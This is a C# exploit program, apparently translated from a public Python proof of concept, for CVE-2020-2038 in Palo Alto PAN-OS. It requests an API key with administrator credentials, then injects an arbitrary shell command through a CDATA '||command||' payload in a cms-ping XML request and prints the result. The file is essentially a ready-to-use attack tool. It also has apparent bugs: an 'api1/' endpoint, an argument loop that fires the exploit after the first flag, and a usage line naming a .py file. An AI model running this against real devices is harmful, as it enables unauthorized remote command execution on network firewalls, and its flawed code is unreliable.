using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.IO;
using System.Threading.Tasks;
using System.Xml.Linq;
using System.Xml;

namespace main
{
    class Program
    {
        static void banner()
        {
            Console.WriteLine("\n###########################################################################");
            Console.WriteLine("# Proof of Concept for CVE-2020-2038                                      #");
            Console.WriteLine("# Vulnerability discovered by Mikhail Klyuchnikov and Nikita Abramov of   #");
			Console.WriteLine("# https://swarm.ptsecurity.com/swarm-of-palo-alto-pan-os-vulnerabilities/ #");
            Console.WriteLine("#                           Exploit by: Juampa Rodríguez (@UnD3sc0n0c1d0) #");
            Console.WriteLine("# This Program developed by navyofficer                                   #");
            Console.WriteLine("# Refernece: https://www.exploit-db.com/exploits/51005'                   #");
            Console.WriteLine("# Translate the code of exploit-db.com from python to c#                  #");
            Console.WriteLine("###########################################################################");
        }

        static string Get(string url, Dictionary<string, string> dic)
        {
            string result = "";
            StringBuilder builder = new StringBuilder();
            builder.Append(url);
            if (dic.Count > 0)
            {
                builder.Append("?");
                int i = 0;
                foreach (var item in dic)
                {
                    if (i > 0)
                        builder.Append("&");
                    builder.AppendFormat("{0}={1}", item.Key, item.Value);
                    i++;
                }
            }
            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(builder.ToString());
            HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
            Stream stream = resp.GetResponseStream();
            try
            {
                using (StreamReader reader = new StreamReader(stream))
                {
                    result = reader.ReadToEnd();
                }
            }
            finally
            {
                stream.Close();
            }
            return result;
        }

        static void exploit(string target, string user, string password, string command)
        {
            string response = "";
            string payload = "";
            string apikey = "";

            Dictionary<string, string> apiparam = new Dictionary<string, string>();
            apiparam.Add("type", "keygen");
            apiparam.Add("user", user);
            apiparam.Add("password",password);
            response = Get(target+"api/", apiparam);

            XmlDocument doc = new XmlDocument();
            doc.LoadXml(response);
            XmlNodeList responsenode = doc.GetElementsByTagName("key");
            apikey = responsenode[0].InnerText.Trim();
            Console.WriteLine("apikey:" + apikey);
            Console.WriteLine();

            
            payload = "<cms-ping><host>8.8.8.8</host><count>1</count><pattern>111<![CDATA[||" + command + "||]]></pattern></cms-ping>";
            Dictionary<string, string> parameters = new Dictionary<string, string>();
            parameters.Add("cmd", payload);
            parameters.Add("type", "op");
            parameters.Add("key", apikey);
            response = Get(target + "api1/", parameters);
            int startIndex = 50;
            int length = response.Length - 50 -20;
            string result = response.Substring(startIndex, length);
            Console.WriteLine(result);
            
        }

        static void usage()
        {
            Console.WriteLine("\nusage: CVE-2020-2038.py\n\n");
            Console.WriteLine("arguments:");
            Console.WriteLine("     -h      show this help message and exit");
            Console.WriteLine("     -t      target URL (ex: http://vulnerable.host/)");
            Console.WriteLine("     -u      target administrator user");
            Console.WriteLine("     -p      pasword of the defined user account");
            Console.WriteLine("     -c      command you want to execute on the target\n");
        }

        static void mainfunc(string[] args)
        {
            string argTarget = "http://127.0.0.1";
            string argUser = "admin";
            string argPassword = "123456";
            string argCommand = "id";

            if (args.Length < 8)
            {
                banner();
                usage();
                System.Environment.Exit(0);
            }

            foreach (var entry in args.Select((value, index) => new { index, value }))
            {
                string argument = entry.value.ToLower();

                switch (argument)
                {
                    case "-h":
                        usage();
                        System.Environment.Exit(0);
                        break;
                    case "-t":
                        argTarget = args[entry.index + 1];
                        break;
                    case "-u":
                        argUser = args[entry.index + 1];
                        break;
                    case "-p":
                        argPassword = args[entry.index + 1];
                        break;
                    case "-c":
                        argCommand = args[entry.index + 1];
                        break;
                }

                banner();
                exploit(argTarget, argUser, argPassword, argCommand);
                System.Environment.Exit(0);
            }
        }

        static void Main(string[] args)
        {
            try{
                // Console.WriteLine(System.AppDomain.CurrentDomain.FriendlyName);
                // Console.WriteLine(args[0].ToString());
                // Console.WriteLine(args.Length);
                mainfunc(args);
            }
            catch{
                Console.WriteLine("Interrupted by users...");
            }
            finally {
                System.Environment.Exit(0);
            }
        }

    }
}
